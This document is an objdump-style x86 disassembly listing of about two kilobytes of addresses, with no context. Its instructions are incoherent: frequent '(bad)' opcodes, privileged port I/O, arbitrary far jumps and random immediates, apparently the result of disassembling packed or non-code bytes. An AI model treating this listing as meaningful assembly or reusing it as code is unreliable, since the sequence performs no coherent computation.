  4139bc:	add    ebp,ebx
  4139be:	out    dx,al
  4139bf:	ret    0xbf64
  4139c2:	and    DWORD PTR [ecx-0x2d7043ad],esi
  4139c8:	adc    BYTE PTR [edx+0x1a7761bb],bl
  4139ce:	cld    
  4139cf:	jnp    0x4139ef
  4139d1:	xchg   ebp,eax
  4139d2:	rcr    BYTE PTR [esi+0x779f07b0],1
  4139d8:	mov    cl,BYTE PTR [eax+0x651c28b3]
  4139de:	xchg   BYTE PTR gs:[ebx+0x33],cl
  4139e2:	jp     0x4139ee
  4139e4:	adc    al,0x60
  4139e6:	inc    eax
  4139e7:	cmp    eax,DWORD PTR [ebp-0x46]
  4139ea:	loope  0x4139f1
  4139ec:	jae    0x4139e5
  4139ee:	jo     0x4139a6
  4139f0:	pop    es
  4139f1:	and    DWORD PTR [edx+0x6],esi
  4139f4:	xor    BYTE PTR [esp+ecx*1+0x1d531335],ah
  4139fb:	mov    ds:0xcf68b63f,eax
  413a00:	test   al,0x10
  413a02:	sub    BYTE PTR [edx+esi*1+0x55c3f1bf],0x98
  413a0a:	dec    edi
  413a0b:	leave  
  413a0c:	cmp    BYTE PTR [esi+0x7d],ch
  413a0f:	in     eax,dx
  413a10:	mov    dl,0x5b
  413a12:	nop
  413a13:	std    
  413a14:	mov    eax,0xdfadb706
  413a19:	or     eax,0x3ef0b088
  413a1e:	inc    ebx
  413a1f:	sbb    al,0xe6
  413a21:	jl     0x4139e8
  413a23:	push   ecx
  413a24:	scas   al,BYTE PTR es:[edi]
  413a25:	pop    ecx
  413a26:	pop    ebp
  413a27:	mov    ah,0x81
  413a29:	fsubr  DWORD PTR ds:0xb0b7557a
  413a2f:	mov    esp,0x2833c514
  413a34:	mov    DWORD PTR [ebx+ebx*4],edi
  413a37:	pop    ds
  413a38:	sub    al,0xde
  413a3a:	xor    dh,BYTE PTR [esi+0x3b4c0adb]
  413a40:	pop    esp
  413a41:	out    dx,al
  413a42:	inc    edx
  413a43:	push   edi
  413a44:	or     BYTE PTR [esi],0xc3
  413a47:	cmp    ebp,DWORD PTR [edx+0x1df05577]
  413a4d:	xor    esi,DWORD PTR [ebp+0xc238b5a]
  413a53:	or     bl,BYTE PTR [edx-0x2b]
  413a56:	sbb    ecx,DWORD PTR [ecx+0x31c45950]
  413a5c:	mov    al,0xcd
  413a5e:	aam    0x5d
  413a60:	sbb    eax,0xbb447b12
  413a65:	jp     0x413ace
  413a67:	xor    BYTE PTR [edx+0xb],ah
  413a6a:	mov    al,0xda
  413a6c:	loopne 0x4139f6
  413a6e:	mov    ds:0xb6db94d3,al
  413a73:	jnp    0x413a35
  413a75:	addr16 ret 0x6d99
  413a79:	add    eax,0xb76b915a
  413a7e:	test   eax,0x56075440
  413a83:	data16 lahf 
  413a85:	aam    0x66
  413a87:	xor    BYTE PTR [ebx-0x66595d9c],cl
  413a8d:	fcomp  QWORD PTR [esi-0x16]
  413a90:	cs jne 0x413a1a
  413a93:	mov    ah,dl
  413a95:	enter  0x145d,0x4f
  413a99:	pop    ds
  413a9a:	and    ebx,DWORD PTR [edx-0x1b]
  413a9d:	lea    eax,[ebp-0x7]
  413aa0:	rcr    BYTE PTR [ebx-0x36c88a7],0x9f
  413aa7:	pushf  
  413aa8:	je     0x413a48
  413aaa:	mov    esp,0x53eb168d
  413aaf:	fwait
  413ab0:	dec    esi
  413ab1:	sbb    eax,0x30d6c9bf
  413ab6:	lds    bp,DWORD PTR ds:0xb40dbd15
  413abd:	or     BYTE PTR [ecx],ah
  413abf:	lods   al,BYTE PTR ds:[esi]
  413ac0:	sbb    al,0xd2
  413ac2:	dec    edi
  413ac3:	push   0xffffffa5
  413ac5:	inc    eax
  413ac6:	and    edi,DWORD PTR ds:[esi]
  413ac9:	mov    cl,0x53
  413acb:	cmp    dh,dh
  413acd:	sub    eax,0x45cce176
  413ad2:	iret   
  413ad3:	push   ecx
  413ad4:	mov    esi,0xb5626a7b
  413ad9:	push   es
  413ada:	mov    edi,0x720ed4d7
  413adf:	jnp    0x413b51
  413ae1:	jecxz  0x413b43
  413ae3:	or     eax,0xa6096221
  413ae8:	cmc    
  413ae9:	lahf   
  413aea:	cmc    
  413aeb:	inc    ecx
  413aec:	aam    0xe4
  413aee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413aef:	lods   al,BYTE PTR ds:[esi]
  413af0:	jnp    0x413b59
  413af2:	mov    dh,0x78
  413af4:	mov    bl,0xf2
  413af6:	ins    DWORD PTR es:[edi],dx
  413af7:	inc    ecx
  413af8:	scas   eax,DWORD PTR es:[edi]
  413af9:	add    ecx,DWORD PTR [ebp+0x4c]
  413afc:	aad    0x83
  413afe:	ror    esi,1
  413b00:	jae    0x413a92
  413b02:	repz and BYTE PTR [ebp-0x4f],bl
  413b06:	cli    
  413b07:	sbb    eax,0x431ac959
  413b0c:	mov    dh,0xf0
  413b0e:	shl    DWORD PTR ds:0x1df085d7,1
  413b14:	repz mov ah,0xd8
  413b17:	idiv   BYTE PTR [ecx-0x18b14edf]
  413b1d:	out    0xab,al
  413b1f:	cmp    ch,BYTE PTR [ecx-0x6b]
  413b22:	out    dx,al
  413b23:	aaa    
  413b24:	addr16 jl 0x413ac4
  413b27:	dec    edx
  413b28:	fnstsw WORD PTR [edx+0x4651cd81]
  413b2e:	outs   dx,DWORD PTR ds:[esi]
  413b2f:	cli    
  413b30:	pusha  
  413b31:	pusha  
  413b32:	sbb    DWORD PTR [edx+0x20],esi
  413b35:	ins    DWORD PTR es:[edi],dx
  413b36:	hlt    
  413b37:	jae    0x413ba9
  413b39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b3a:	adc    edi,ebx
  413b3c:	sbb    esp,edx
  413b3e:	inc    ebp
  413b3f:	in     eax,dx
  413b40:	pop    ds
  413b41:	jnp    0x413b0c
  413b43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b44:	popf   
  413b45:	mov    eax,ds:0x4bfb679f
  413b4a:	cmp    DWORD PTR [ebx],ebx
  413b4c:	pop    cx
  413b4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b4f:	xor    al,0x76
  413b51:	add    edi,eax
  413b53:	pop    edx
  413b54:	xor    esi,DWORD PTR [edx+0x24a5d0c3]
  413b5a:	xchg   edx,eax
  413b5b:	sub    ebx,DWORD PTR [eax+eax*4]
  413b5e:	fcmovb st,st(7)
  413b60:	adc    ebx,DWORD PTR [ecx]
  413b62:	inc    ebp
  413b63:	sub    BYTE PTR [eax+0x63],dh
  413b66:	pop    ds
  413b67:	cmp    ah,ah
  413b69:	cmp    al,0xde
  413b6b:	int3   
  413b6c:	and    bl,al
  413b6e:	jle    0x413bc2
  413b70:	retf   0x6596
  413b73:	icebp  
  413b74:	mov    ds:0xb5877999,eax
  413b79:	push   edi
  413b7a:	(bad)  
  413b7b:	pop    esp
  413b7c:	sbb    ch,al
  413b7e:	fld    DWORD PTR [esi+0x1d]
  413b81:	test   eax,0xa2363452
  413b86:	fcmovbe st,st(7)
  413b88:	adc    dl,BYTE PTR [ebp+ebx*1+0x122248e6]
  413b8f:	outs   dx,DWORD PTR ds:[esi]
  413b90:	aam    0x11
  413b92:	dec    ebp
  413b93:	addr16 in eax,0xfa
  413b96:	cdq    
  413b97:	lea    edx,[ecx]
  413b99:	fcom   DWORD PTR [eax-0x3877cd1b]
  413b9f:	jg     0x413b29
  413ba1:	inc    esp
  413ba2:	out    0x3e,eax
  413ba4:	adc    edx,DWORD PTR [ebx]
  413ba6:	dec    esi
  413ba7:	aas    
  413ba8:	lds    esi,FWORD PTR [edi+0x5f11625b]
  413bae:	das    
  413baf:	or     BYTE PTR [ecx-0x74a8584d],0xdb
  413bb6:	lahf   
  413bb7:	xor    BYTE PTR [ecx-0x2beba415],bh
  413bbd:	mov    es:0x55555450,eax
  413bc3:	mov    cl,0x4
  413bc5:	push   ss
  413bc6:	leave  
  413bc7:	jno    0x413bc0
  413bc9:	xor    esp,DWORD PTR ds:0x3c31d975
  413bcf:	mov    WORD PTR [eax],ds
  413bd1:	call   0xd7d3:0x9140f3a4
  413bd8:	push   edx
  413bd9:	mov    ch,al
  413bdb:	mov    dl,0x1c
  413bdd:	call   0x56bc45dc
  413be2:	outs   dx,BYTE PTR ds:[esi]
  413be3:	(bad)  
  413be4:	add    al,0xd
  413be6:	mov    ds:0x3b71c52d,eax
  413beb:	adc    BYTE PTR ds:0xde495dfa,al
  413bf1:	jle    0x413bdb
  413bf3:	sbb    bl,BYTE PTR [esi+ebx*1-0x27]
  413bf7:	outs   dx,BYTE PTR ds:[esi]
  413bf8:	sbb    DWORD PTR [eax],edx
  413bfa:	dec    ebx
  413bfb:	and    al,0x9
  413bfd:	imul   esp,esp,0xffffff8b
  413c00:	xlat   BYTE PTR ds:[ebx]
  413c01:	in     al,dx
  413c02:	jl     0x413c73
  413c04:	lea    ecx,[edi+0x6]
  413c07:	sahf   
  413c08:	sahf   
  413c09:	adc    eax,DWORD PTR [ecx-0x34]
  413c0c:	popf   
  413c0d:	es pop ecx
  413c0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c10:	test   dh,ch
  413c12:	into   
  413c13:	dec    esi
  413c14:	push   ecx
  413c15:	int3   
  413c16:	repnz add cl,BYTE PTR [ebx-0x4b]
  413c1a:	shr    DWORD PTR [ebp+0xa],0xbb
  413c1e:	setne  BYTE PTR [edx]
  413c21:	inc    edx
  413c22:	in     eax,0x98
  413c24:	adc    al,0x78
  413c26:	daa    
  413c27:	fist   DWORD PTR [edi-0xbadf591]
  413c2d:	or     ebx,DWORD PTR [esi+0x6a]
  413c30:	xchg   ecx,eax
  413c31:	pop    ebp
  413c32:	dec    ebx
  413c33:	xor    esp,ebx
  413c35:	aaa    
  413c36:	daa    
  413c37:	and    ch,0x16
  413c3a:	cs cld 
  413c3c:	test   eax,0x4ef3fcad
  413c41:	cmp    eax,0xaaaef5ad
  413c46:	cwde   
  413c47:	dec    ebx
  413c48:	(bad)  
  413c49:	aas    
  413c4a:	pop    ss
  413c4b:	(bad)  
  413c4c:	xor    eax,0xc27fcf2c
  413c51:	mov    al,ds:0x663d0bb
  413c56:	mov    ebp,0x6aeda8c1
  413c5b:	cmp    DWORD PTR cs:[edx],esp
  413c5e:	and    dl,bh
  413c60:	mov    dl,BYTE PTR [ebx+0x15]
  413c63:	xchg   ecx,eax
  413c64:	das    
  413c65:	repz cs mov eax,0x790edb3c
  413c6c:	lea    edi,[ebx]
  413c6e:	ficom  DWORD PTR [edi+0x21e847c4]
  413c74:	out    dx,al
  413c75:	stc    
  413c76:	adc    edx,DWORD PTR [ebx+eiz*2+0x2]
  413c7a:	in     al,0xee
  413c7c:	jo     0x413ca5
  413c7e:	push   DWORD PTR [eax-0x5cdd66fc]
  413c84:	dec    esi
  413c85:	push   0x58
  413c87:	dec    ebx
  413c88:	push   0xffffffcf
  413c8a:	fwait
  413c8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c8c:	iret   
  413c8d:	ret    0xd1d2
  413c90:	xor    DWORD PTR [ecx-0x65aa6a6],0xffffffb2
  413c97:	test   BYTE PTR [edi-0x1b5bd041],ch
  413c9d:	out    dx,al
  413c9e:	sti    
  413c9f:	and    eax,0xec8a4bae
  413ca4:	xchg   ebx,eax
  413ca5:	ins    DWORD PTR es:[edi],dx
  413ca6:	icebp  
  413ca7:	fdivp  st(4),st
  413ca9:	cmp    DWORD PTR [esi-0x46],ebp
  413cac:	mov    esp,DWORD PTR [ecx-0x47]
  413caf:	lock fisubr DWORD PTR [ebx-0x2d]
  413cb3:	retf   
  413cb4:	and    al,0x94
  413cb6:	xchg   ebx,eax
  413cb7:	(bad)  [esp+ebp*1]
  413cba:	std    
  413cbb:	mov    WORD PTR [ebp+eax*8-0x1e],cs
  413cbf:	(bad)  
  413cc0:	mov    DWORD PTR [ecx],0x9cbe7b29
  413cc6:	xor    DWORD PTR [esi-0x78bdac1],ebx
  413ccc:	jo     0x413d46
  413cce:	test   al,0x53
  413cd0:	mov    cl,0x44
  413cd2:	xchg   ebp,eax
  413cd3:	pushf  
  413cd4:	add    eax,0x654f6485
  413cd9:	fwait
  413cda:	push   ebp
  413cdb:	inc    ebx
  413cdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cdd:	int    0xbd
  413cdf:	mov    dh,cl
  413ce1:	inc    edx
  413ce2:	(bad)  
  413ce3:	sbb    DWORD PTR [ecx+0x3a696553],0x464b12c4
  413ced:	xchg   ebx,eax
  413cee:	adc    DWORD PTR [esi],esi
  413cf0:	push   ecx
  413cf1:	jae    0x413cdd
  413cf3:	ss mov bl,0xe
  413cf6:	ja     0x413c86
  413cf8:	mov    BYTE PTR [ecx+0x5484818d],al
  413cfe:	mov    cl,0x6c
  413d00:	sub    BYTE PTR [esi],0x76
  413d03:	mov    ds:0xe0b812a9,al
  413d08:	stc    
  413d09:	call   0x194db822
  413d0e:	add    BYTE PTR [ecx+0x67],dl
  413d11:	test   eax,0xef911db4
  413d16:	jne    0x413d2c
  413d18:	fwait
  413d19:	mov    ch,dh
  413d1b:	pushf  
  413d1c:	mov    al,ds:0x7755084d
  413d21:	outs   dx,DWORD PTR ds:[esi]
  413d22:	mov    ecx,0x6e1a5e73
  413d27:	cmp    eax,0xac0b3e05
  413d2c:	mov    bx,0xde92
  413d30:	mov    bl,0xc3
  413d32:	rcr    DWORD PTR [ebx+0x794d67f2],1
  413d38:	out    0x6f,al
  413d3a:	js     0x413da3
  413d3c:	xor    ah,BYTE PTR [ebp+0x47]
  413d3f:	lahf   
  413d40:	pop    ecx
  413d41:	pop    edx
  413d42:	mov    WORD PTR [ecx],?
  413d44:	cs and al,0xe1
  413d47:	push   esp
  413d48:	inc    ebp
  413d49:	jl     0x413d96
  413d4b:	aad    0x8b
  413d4d:	jge    0x413d83
  413d4f:	gs ins BYTE PTR es:[edi],dx
  413d51:	mov    eax,ds:0xa4fde099
  413d56:	lea    esp,[ecx]
  413d58:	das    
  413d59:	inc    edx
  413d5a:	jmp    DWORD PTR [edi+0x5135b1c4]
  413d61:	adc    esi,edi
  413d63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d64:	sub    DWORD PTR [ecx+0x6828408d],ecx
  413d6a:	imul   cl
  413d6c:	push   esp
  413d6d:	jmp    0xda38:0xf9b21b04
  413d74:	jns    0x413d59
  413d76:	jge    0x413dd2
  413d78:	call   0x25d97135
  413d7d:	and    bl,bl
  413d7f:	cli    
  413d80:	add    dh,dh
  413d82:	dec    edi
  413d83:	in     al,0x82
  413d85:	mov    al,0x1d
  413d87:	or     al,0xb9
  413d89:	test   eax,0x9dffe0fa
  413d8e:	mov    es,ecx
  413d90:	mov    ebp,0x6ac137e5
  413d95:	or     BYTE PTR [esi+0x30],ch
  413d98:	rcr    dh,0x84
  413d9b:	mov    al,ds:0xa202836e
  413da0:	mov    ds:0x827e50a0,eax
  413da5:	mov    eax,ds:0x396fcd2a
  413daa:	icebp  
  413dab:	retf   0x2d6f
  413dae:	retf   0x8784
  413db1:	ins    BYTE PTR es:[edi],dx
  413db2:	aam    0xa2
  413db4:	call   0x12bb471c
  413db9:	lea    edi,[esi+0x38336f71]
  413dbf:	mov    ch,0xd5
  413dc1:	pop    edi
  413dc2:	push   esi
  413dc3:	shl    DWORD PTR [edi],0xba
  413dc6:	lock cdq 
  413dc8:	and    al,0x6b
  413dca:	add    BYTE PTR [edx],bl
  413dcc:	sub    BYTE PTR [ebx+0x4c],0xd3
  413dd0:	sub    al,0x3
  413dd2:	in     eax,dx
  413dd3:	push   eax
  413dd4:	xchg   edi,eax
  413dd5:	test   BYTE PTR [ebp-0x56],ch
  413dd8:	mov    ah,0x2f
  413dda:	mov    esi,0x7811b974
  413ddf:	pop    esi
  413de0:	adc    al,0x6c
  413de2:	sbb    bh,al
  413de4:	ins    DWORD PTR es:[edi],dx
  413de5:	xor    BYTE PTR [ebx+0x1f145baa],al
  413deb:	mov    edi,0x59efc5ad
  413df0:	sub    DWORD PTR [edi],esi
  413df2:	neg    BYTE PTR [esi]
  413df4:	jp     0x413e30
  413df6:	xchg   cl,bh
  413df8:	in     eax,dx
  413df9:	mov    cl,0x8d
  413dfb:	loopne 0x413e60
  413dfd:	ins    BYTE PTR es:[edi],dx
  413dfe:	mov    esp,0x59f2e9d2
  413e03:	lea    esp,[edx]
  413e05:	das    
  413e06:	xor    al,0x60
  413e08:	inc    esi
  413e09:	stos   DWORD PTR es:[edi],eax
  413e0a:	test   ecx,ecx
  413e0c:	mov    ebp,0x9747f93a
  413e11:	xor    eax,0x49aef794
  413e16:	pop    ss
  413e17:	cwde   
  413e18:	nop
  413e19:	adc    ah,BYTE PTR [ecx]
  413e1b:	mov    eax,ds:0x678a2c9e
  413e20:	cs aas 
  413e22:	out    0xbc,al
  413e24:	jg     0x413dd6
  413e26:	and    al,0xdb
  413e28:	daa    
  413e29:	hlt    
  413e2a:	xlat   BYTE PTR ds:[ebx]
  413e2b:	fisubr WORD PTR [edx+0x6ca08af7]
  413e31:	into   
  413e32:	outs   dx,DWORD PTR ds:[esi]
  413e33:	idiv   BYTE PTR [esi+0x58]
  413e36:	mov    al,ds:0x32651e18
  413e3b:	fstp   TBYTE PTR [ebp+0x48a4abca]
  413e41:	push   ss
  413e42:	jmp    0x413e9a
  413e44:	jp     0x413ea9
  413e46:	xor    BYTE PTR [ecx],dl
  413e48:	(bad)  
  413e4a:	clc    
  413e4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e4c:	ja     0x413e2d
  413e4e:	in     al,dx
  413e4f:	mov    ecx,0x5d31fd11
  413e54:	or     DWORD PTR [ebx-0x51],0xfffffffb
  413e58:	sub    eax,0xd2e83afa
  413e5d:	mov    eax,ds:0xa92a73ba
  413e62:	jb     0x413dec
  413e64:	retf   0x7039
  413e67:	into   
  413e68:	push   eax
  413e69:	jnp    0x413e7e
  413e6b:	pop    ecx
  413e6c:	aam    0x77
  413e6e:	jne    0x413e23
  413e70:	sbb    BYTE PTR [esi+ecx*1],cl
  413e73:	mov    ds:0xfb278598,eax
  413e78:	jg     0x413e07
  413e7a:	and    BYTE PTR [ebx],ch
  413e7c:	sar    al,1
  413e7e:	cmp    cl,BYTE PTR [ebp-0x5ae5354e]
  413e84:	call   0xbb7b:0xb5627d15
  413e8b:	out    0xbe,al
  413e8d:	or     esi,esp
  413e8f:	shl    DWORD PTR [edx+0x42],1
  413e92:	aas    
  413e93:	push   cs
  413e94:	inc    ecx
  413e95:	jmp    0x3db8:0x520dbf97
  413e9c:	mov    al,ds:0xb82c50cf
  413ea1:	ret    0x32d2
  413ea4:	lea    ecx,[ebp-0x56]
  413ea7:	xor    ah,BYTE PTR [edx+0x1b299c07]
  413ead:	mov    ch,0x26
  413eaf:	add    esi,DWORD PTR [ebx+eax*4+0x75]
  413eb3:	adc    eax,0x47371d25
  413eb8:	mov    dh,0xbe
  413eba:	push   eax
  413ebb:	jmp    0x413e82
  413ebd:	ds and ebx,esp
  413ec0:	(bad)  
  413ec1:	scas   al,BYTE PTR es:[edi]
  413ec2:	shl    BYTE PTR [eax+0x52300be2],cl
  413ec8:	fcomp  st(6)
  413eca:	bound  ebp,QWORD PTR [ecx-0x71]
  413ecd:	mov    edi,0xab64a718
  413ed2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ed3:	and    eax,0xa53bc306
  413ed8:	mov    cl,0x8f
  413eda:	sti    
  413edb:	cli    
  413edc:	and    al,0x6d
  413ede:	push   edx
  413edf:	jb     0x413efd
  413ee1:	adc    al,0xed
  413ee3:	jecxz  0x413e6e
  413ee5:	and    ah,dh
  413ee7:	jmp    0x1cc7:0x6b1fa3d1
  413eee:	or     ah,BYTE PTR [ebx-0xdf8d9cb]
  413ef4:	ss es jle 0x413ebe
  413ef8:	xchg   DWORD PTR [ebx-0x75],esp
  413efb:	inc    ebp
  413efc:	push   esp
  413efd:	cmp    DWORD PTR [esp+eiz*8],0xd119890c
  413f04:	je     0x413eb8
  413f06:	mov    ebx,0xa3ecae2a
  413f0b:	out    dx,al
  413f0c:	or     al,0x41
  413f0e:	sub    DWORD PTR [ebp+0x4597f9ef],esp
  413f14:	or     al,0xfe
  413f16:	dec    ecx
  413f17:	cmp    cl,dl
  413f19:	into   
  413f1a:	cmp    eax,0x1f7d54fe
  413f1f:	cmp    DWORD PTR [edx+0x13],0xffffff9c
  413f23:	es jmp 0x7f4a652c
  413f29:	out    0x8f,eax
  413f2b:	mov    ch,0xac
  413f2d:	mov    edx,0x1f4d5ec3
  413f32:	orps   xmm4,XMMWORD PTR [edx+0x70edafae]
  413f39:	add    eax,0xb235dfc8
  413f3e:	pop    esi
  413f3f:	in     al,0x88
  413f41:	mov    esi,0x1ec6d6fc
  413f46:	inc    esp
  413f47:	jmp    0xd1febe09
  413f4c:	punpckhwd mm7,QWORD PTR [esi-0x54]
  413f50:	or     DWORD PTR [edx+eax*8+0x25eeeedd],ebp
  413f57:	test   eax,0xfc3673e1
  413f5c:	adc    ebx,DWORD PTR [edi]
  413f5e:	fbld   TBYTE PTR [ebx+ecx*4]
  413f61:	(bad)  
  413f63:	out    dx,eax
  413f64:	sub    eax,0xe851a207
  413f69:	clc    
  413f6a:	jg     0x413f4b
  413f6c:	pop    esp
  413f6d:	adc    dl,BYTE PTR [edi+0x61]
  413f70:	pusha  
  413f71:	aad    0xb9
  413f73:	sbb    BYTE PTR [eax+0x78f2ff1e],bl
  413f79:	add    edi,DWORD PTR [esi+0x73fac43e]
  413f7f:	(bad)  
  413f80:	mov    ch,0x70
  413f82:	mov    DWORD PTR [edx+edx*2-0x323cfdcc],ebp
  413f89:	mov    esi,0x1763cc10
  413f8e:	sbb    BYTE PTR [edi+edx*1+0x64],cl
  413f92:	out    0xa6,eax
  413f94:	sub    bl,BYTE PTR [ebx+0x341715d7]
  413f9a:	jecxz  0x413f58
  413f9c:	jg     0x41400c
  413f9e:	xor    al,0xb8
  413fa0:	in     eax,0x8b
  413fa2:	adc    bh,BYTE PTR [ebp-0x20749f8c]
  413fa8:	retf   0x8def
  413fab:	pop    esi
  413fac:	and    DWORD PTR [ecx-0x31],edx
  413faf:	dec    ebp
  413fb0:	repnz mov eax,ds:0xcfdf6b4e
  413fb6:	je     0x413fd3
  413fb8:	scas   eax,DWORD PTR es:[edi]
  413fb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fba:	ins    BYTE PTR es:[edi],dx
  413fbb:	ds mov esp,0xdbbe256b
  413fc1:	mov    ds:0x13803044,eax
  413fc6:	lods   eax,DWORD PTR ds:[esi]
  413fc7:	mov    eax,ds:0x35c4abbb
  413fcc:	ret    0xa603
  413fcf:	mov    ah,0x1d
  413fd1:	mov    ah,0x9
  413fd3:	push   ecx
  413fd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fd5:	fistp  WORD PTR [ecx+0x6f2295eb]
  413fdb:	idiv   DWORD PTR [esi-0x58]
  413fde:	xchg   ebx,eax
  413fdf:	push   ebp
  413fe0:	cmp    eax,0xd4f98b30
  413fe5:	and    esp,DWORD PTR ds:0x590ae4e9
  413feb:	jle    0x414038
  413fed:	jbe    0x414033
  413fef:	add    edi,edi
  413ff1:	or     ecx,edx
  413ff3:	je     0x413fb7
  413ff5:	les    edi,FWORD PTR [ebp+0x4ef94778]
  413ffb:	retf   
  413ffc:	add    al,BYTE PTR cs:[eax-0x24b4fe91]
  414003:	or     al,0x7b
  414005:	repz cmp al,0x88
  414008:	mov    dh,0xec
  41400a:	xlat   BYTE PTR ds:[ebx]
  41400b:	idiv   BYTE PTR [ebx+0x63d9e9b6]
  414011:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414012:	loope  0x414048
  414014:	jecxz  0x41403b
  414016:	mov    esi,0x1d77bff
  41401b:	dec    edi
  41401c:	out    dx,al
  41401d:	adc    eax,0x76631fc0
  414022:	aas    
  414023:	rcl    dl,cl
  414025:	and    eax,0x9dfc5c79
  41402a:	inc    esp
  41402b:	and    eax,0x3b9a75d7
  414030:	cmp    BYTE PTR [ebx-0x29],bl
  414033:	es pop esi
  414035:	sbb    BYTE PTR [ecx-0x56],0xcd
  414039:	and    BYTE PTR [edi+edi*4],al
  41403c:	xor    dh,BYTE PTR [edi+0x463a78b]
  414042:	mov    ebp,DWORD PTR [ebx]
  414044:	xchg   edx,eax
  414045:	dec    edx
  414046:	retf   0x2b6b
  414049:	ins    BYTE PTR es:[edi],dx
  41404a:	xor    eax,DWORD PTR [edi]
  41404c:	jmp    0xf3cc:0x746edc7e
  414053:	(bad)  
  414054:	aad    0x89
  414056:	push   ebp
  414057:	call   0x3bff:0xebb54d8
  41405e:	pop    esi
  41405f:	cmp    BYTE PTR [ebx-0x64],bl
  414062:	ds push es
  414064:	mov    edx,0x74d945d1
  414069:	push   ecx
  41406a:	out    dx,eax
  41406b:	daa    
  41406c:	mov    ecx,0x98c20830
  414071:	cwde   
  414072:	sbb    ch,ch
  414074:	shl    DWORD PTR [edi],cl
  414076:	mov    dh,BYTE PTR [ebx+0x2ab6638c]
  41407c:	lods   eax,DWORD PTR ds:[si]
  41407e:	xchg   ecx,eax
  41407f:	push   edi
  414080:	cmp    BYTE PTR [ecx+eax*4-0x3afd5711],0x46
  414088:	mov    ds:0xee672f58,al
  41408d:	mov    ah,0x74
  41408f:	mov    WORD PTR [esi-0x59],cs
  414092:	jae    0x41401b
  414094:	inc    ecx
  414095:	rcl    BYTE PTR [ebp+0x75],cl
  414098:	push   ebx
  414099:	in     eax,0xb0
  41409b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41409c:	stc    
  41409d:	cmp    esp,DWORD PTR [eax+esi*1+0x1757075a]
  4140a4:	push   edx
  4140a5:	and    edi,ebx
  4140a7:	sahf   
  4140a8:	sbb    DWORD PTR [eax-0x4dbf076a],edi
  4140ae:	jae    0x414047
  4140b0:	pop    eax
  4140b1:	sbb    ch,BYTE PTR [esi+edi*2-0x3e3dc032]
  4140b8:	leave  
  4140b9:	inc    edx
  4140ba:	out    0x74,al
  4140bc:	inc    ebp
  4140bd:	push   ss
  4140be:	jle    0x414117
  4140c0:	(bad)  
  4140c1:	and    BYTE PTR [ecx+ebx*2],cl
  4140c4:	lea    edi,[edx+esi*8+0x42b5c810]
  4140cb:	jno    0x4140e3
  4140cd:	xchg   edi,eax
  4140ce:	mov    dh,0x5d
  4140d0:	sub    DWORD PTR [esp+ecx*4+0x51],esp
  4140d4:	js     0x414100
  4140d6:	sub    ah,dh
  4140d8:	retf   
  4140d9:	pop    ss
  4140da:	rcl    BYTE PTR ds:0x3a866558,1
  4140e0:	clc    
  4140e1:	fimul  DWORD PTR [edx-0x5f6835c1]
  4140e7:	loope  0x414166
  4140e9:	xor    DWORD PTR [edx+0x4cbc9464],0x5a67c917
  4140f3:	mov    bh,0x88
  4140f5:	xchg   BYTE PTR [ebp+0x76],cl
  4140f8:	jecxz  0x4140f4
  4140fa:	xor    DWORD PTR [ebp-0x55],0x54
  4140fe:	cmp    al,0x62
  414100:	adc    DWORD PTR [edx-0x343caa7a],esi
  414106:	retf   
  414107:	out    dx,al
  414108:	addr16 xor al,0x29
  41410b:	xor    eax,0x67f5b363
  414110:	out    dx,al
  414111:	xchg   ebx,eax
  414112:	imul   esi,DWORD PTR [ebx],0x1b
  414115:	pop    edi
  414116:	xchg   edi,eax
  414117:	cmp    BYTE PTR [edi+ecx*4+0x37],bl
  41411b:	push   0x46a6efdf
  414120:	popf   
  414121:	xchg   ebx,eax
  414122:	ror    BYTE PTR [eax],cl
  414124:	in     eax,dx
  414125:	push   es
  414126:	or     eax,0x13e156d4
  41412b:	fisubr WORD PTR [ecx]
  41412d:	push   ecx
  41412e:	repz and al,0xac
  414131:	mov    WORD PTR [ebp+0x7dfc477b],?
  414137:	inc    ebp
  414138:	mov    ds,WORD PTR [edx+eax*1]
  41413b:	pop    edi
  41413c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41413d:	xor    al,0x3b
  41413f:	add    eax,0x81ec1609
  414144:	adc    al,0x4
  414146:	sahf   
  414147:	es test BYTE PTR gs:0xa623f0f1,bh
  41414f:	call   DWORD PTR [ecx-0x2f0d027f]
  414155:	in     al,dx
  414156:	fcom   st(7)
  414158:	lea    edi,[edi+0x12]
  41415b:	cmc    
  41415c:	dec    edx
  41415d:	ja     0x4141d9
  41415f:	repnz dec esp
  414161:	xor    BYTE PTR [esi+0x24a47cc6],dl
  414167:	mov    ecx,0x62984507
  41416c:	fild   DWORD PTR [ebx-0x76860036]
  414172:	pushf  
  414173:	add    al,0xd5
  414175:	dec    edi
  414176:	pop    edi
  414177:	loopne 0x4141bc
  414179:	add    bh,bl
  41417b:	jp     0x414165
  41417d:	(bad)  
  41417e:	hlt    
  41417f:	push   es
  414180:	inc    BYTE PTR [esi-0x9]
  414183:	iret   
  414184:	push   0xffffffcc
  414186:	jo     0x414129
  414188:	xor    DWORD PTR [ebx],0x1c
  41418b:	xchg   edx,eax
  41418c:	repz xchg edi,eax
  41418e:	retf   0xb31c
  414191:	mov    ds:0xa4166524,eax
  414196:	pop    esi
  414197:	mov    ds:0x18d558de,al
  41419c:	bound  edx,QWORD PTR [ecx-0x7c7c67f2]
  4141a2:	or     edx,ebp
  4141a4:	cmc    
  4141a5:	mov    ebp,0x676ad46d
  4141aa:	and    eax,0x7f5ea9fb
  4141af:	and    BYTE PTR [ecx+0x48],cl
  4141b2:	and    esp,DWORD PTR [ecx+edi*8-0xf]
  4141b6:	cs jbe 0x414150
  4141b9:	adc    al,0xc3
  4141bb:	(bad)  
  4141bc:	aam    0xfb
  4141be:	in     al,dx
